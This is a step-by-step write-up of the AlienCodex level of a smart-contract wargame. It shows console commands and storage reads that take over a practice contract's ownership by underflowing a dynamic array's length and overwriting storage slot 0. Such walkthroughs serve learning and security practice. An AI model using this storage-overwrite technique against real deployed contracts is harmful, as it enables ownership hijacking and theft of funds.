# Level 19: AlienCodex

### Wargame
Claim ownership to complete the level.

### Key InsightsUse
* Storage Slot

### Attack Steps
1. Before executing the attack, display the address of the target contract and inspect storage slot 0 and 1 to understand the current contract state.
    ```bash
    > instance
    '0x7295e2209Cb7991d9D820eb5Bc0cEEb6ED93D925'

    > await contract.owner()
    '0x0BC04aa6aaC163A6B3667636D798FA053D43BD11'

    > await contract.isOwner()
    false

    > await web3.eth.getStorageAt(instance, 0)
    '0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'

    > await web3.eth.getStorageAt(instance, 1)
    '0x0000000000000000000000000000000000000000000000000000000000000000'
    ```
* Slot 0 stores the current owner address.
* Slot 1 stores the length of the codex dynamic array, which is 0 initially.

2. Deploy the AlienCodexAttack contract, passing the target contract address as the constructor argument.

3. Call attackPrepare() from the AlienCodexAttack contract.
* Unlocks access to internal array functions.
* Exploits an underflow to allow writing to any storage slot in the contract.

4. After the transaction is confirmed, verify that the storage has changed:
    ```bash
    > await web3.eth.getStorageAt(instance, 0)
    '0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11'

    > await web3.eth.getStorageAt(instance, 1)
    '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
    ```
* Notice that slot 1 has now been overwritten with the maximum possible value for a uint256, effectively allowing index-based writes to any storage slot using codex.

5. Call attack() on the AlienCodexAttack contract.
* This step calculates the index needed to overwrite slot 0 and sets it to your address.

6. After the transaction is confirmed, confirm the ownership has been taken over:
    ```bash
    > await web3.eth.getStorageAt(instance, 0)
    '0x000000000000000000000000eb47eab0027b0ddd5615d00f9d83ec0e71d3aeff'

    > await contract.owner()
    '0xEB47eAB0027B0DDd5615D00f9D83eC0e71D3aeFf'

    > await contract.isOwner()
    true
	```
* The owner has now been successfully overwritten with your address.
* You now pass the isOwner() check.
